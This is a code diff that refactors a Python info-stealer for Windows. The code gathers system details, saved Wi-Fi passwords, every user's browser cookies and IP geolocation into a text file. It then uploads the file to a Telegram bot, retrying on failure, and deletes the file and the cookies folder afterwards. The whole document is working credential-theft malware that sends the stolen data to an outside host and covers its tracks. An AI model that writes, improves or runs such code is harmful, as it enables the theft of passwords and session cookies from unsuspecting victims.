@@ -8,6 +8,7 @@ import shutil
 import socket
 import sqlite3
 import subprocess
+import time
 import uuid
 from datetime import datetime
 from datetime import timedelta
@@ -22,7 +23,9 @@ from dotenv import load_dotenv
 load_dotenv()
 
 
-def get_data_by_ip():
+def get_data_by_ip(file_name):
+	"""Getting all information via IP through API"""
+
 	try:
 		response = requests.get('http://ip-api.com/json/').json()
 		data = {
@@ -36,9 +39,12 @@ def get_data_by_ip():
 			'[Lat]': response.get('lat'),
 			'[Lon]': response.get('lon'),
 		}
-		return data
+		for k, v in data.items():
+			with open(file=file_name, mode='a', encoding='utf-8') as file:
+				file.write(f'{k}: {v}\n')
 	except requests.exceptions.ConnectionError:
-		return 'No internet'
+		with open(file=file_name, mode='a', encoding='utf-8') as file:
+			file.write(f'Sorry... There were no internet connection.')
 
 
 def get_system_info():
@@ -50,6 +56,16 @@ def get_system_info():
 	        'mac-address': ':'.join(re.findall('..', '%012x' % uuid.getnode())), 'processor': platform.processor(),
 	        'ram': str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"}
 	return info
+
+
+def write_system_info(file_name):
+	"""Writing down system info to file"""
+
+	for key, value in get_system_info().items():
+		with open(file=file_name, mode='a', encoding='utf-8') as file:
+			file.write(f'{key.capitalize()}: {value}\n')
+	with open(file=file_name, mode='a', encoding='utf-8') as file:
+		file.write('\n')
 
 
 def get_chrome_datetime(chromedate):
@@ -157,13 +173,38 @@ def get_cookies(file_name):
 					file.write(f'{"=" * 50}\n\n\n')
 
 
-def get_all_information():
-	"""Extracting Windows Wi-Fi passwords, all main system infromation
-	and cookies into .txt file"""
+def send_file_telegram(file_name):
+	"""Sending file to telegram bot"""
 
-	main_comp_info = get_system_info()
-	list_of_keys = list(main_comp_info.keys())
-	file_name = f'system_info__{main_comp_info.get(list_of_keys[4])}.txt'
+	token = os.getenv('TOKEN')
+	chat_id = os.getenv('CHAT_ID')
+	url = f'https://api.telegram.org/bot{token}/sendDocument?chat_id={chat_id}'
+
+	status_success = '200'
+	attempts = 0
+
+	while attempts < 5:
+		req = requests.post(url, files={'document': open(file=file_name, encoding='utf-8')})
+		if str(req.status_code) != status_success:
+			time.sleep(5)
+			attempts += 1
+		else:
+			break
+
+
+def delete_all_files(file_name):
+	"""Deleting all files from folder"""
+
+	try:
+		os.remove(file_name)
+		os.remove(str(pathlib.Path(__file__).parent.resolve()) + r"\cookies")
+	except OSError:
+		pass
+
+
+def extract_wifi_data(file_name):
+	"""Extracting Windows Wi-Fi passwords"""
+
 	profile_info = ''
 	rus_names = ['Все профили пользователей', 'Содержимое ключа']
 	eng_names = ['All User Profile', 'Key Content']
@@ -187,14 +228,6 @@ def get_all_information():
 			except IndexError:
 				password = None
 
-			# Writing down main system information into file
-			if profile == profiles[0]:
-				for key, value in main_comp_info.items():
-					with open(file=file_name, mode='a', encoding='utf-8') as file:
-						file.write(f'{key.capitalize()}: {value}\n')
-				with open(file=file_name, mode='a', encoding='utf-8') as file:
-					file.write('\n')
-
 			# Writing down wifi profiles' information
 			with open(file=file_name, mode='a', encoding='utf-8') as file:
 				file.write(f'Profile: {profile}\nPassword: {password}\n\n')
@@ -202,33 +235,31 @@ def get_all_information():
 		with open(file=file_name, mode='a', encoding='utf-8') as file:
 			file.write(f'Sorry... There were no connections.')
 
+
+def get_all_information():
+	"""Getting all information together"""
+
+	main_comp_info = get_system_info()
+	list_of_keys = list(main_comp_info.keys())
+	file_name = f'system_info__{main_comp_info.get(list_of_keys[4])}.txt'
+
+	# Writing main computer info to file
+	write_system_info(file_name)
+
+	# Writing wifi data to file
+	extract_wifi_data(file_name)
+
 	# Getting all users' cookies
 	get_cookies(file_name)
 
 	# Getting IP address
-	ip_data = get_data_by_ip()
-
-	if ip_data == 'No internet':
-		with open(file=file_name, mode='a', encoding='utf-8') as file:
-			file.write(f'Sorry... There were no internet connection.')
-	else:
-		for k, v in ip_data.items():
-			with open(file=file_name, mode='a', encoding='utf-8') as file:
-				file.write(f'{k}: {v}\n')
-
-	token = os.getenv('TOKEN')
-	chat_id = os.getenv('CHAT_ID')
-	url = f'https://api.telegram.org/bot{token}/sendDocument?chat_id={chat_id}'
+	get_data_by_ip(file_name)
 
 	# Trying to send file via telegram bot
-	requests.post(url, files={'document': open(file=file_name, encoding='utf-8')})
+	send_file_telegram(file_name)
 
 	# Trying to delete our files
-	try:
-		os.remove(file_name)
-		os.remove(str(pathlib.Path(__file__).parent.resolve()) + r"\cookies")
-	except OSError:
-		pass
+	delete_all_files(file_name)
 
 
 def main():
